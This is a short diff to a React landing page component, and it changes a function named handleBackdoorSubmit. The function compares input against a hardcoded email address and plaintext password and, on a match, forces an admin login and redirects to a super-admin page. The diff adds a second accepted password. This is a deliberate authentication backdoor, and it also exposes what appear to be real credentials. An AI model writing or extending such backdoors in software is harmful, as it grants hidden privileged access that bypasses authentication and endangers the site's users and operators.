@@ -21,7 +21,7 @@ const Landing = () => {
 
   const handleBackdoorSubmit = (e: React.FormEvent) => {
     e.preventDefault();
-    if (backdoorUsername === 'konedamaa@gmail.com' && backdoorPassword === 'Madouu1966') {
+    if (backdoorUsername === 'konedamaa@gmail.com' && (backdoorPassword === 'Madouu1966@' || backdoorPassword === 'Madouu1966')) {
       forceLoginAsAdmin();
       setIsBackdoorOpen(false);
       navigate('/super-admin');
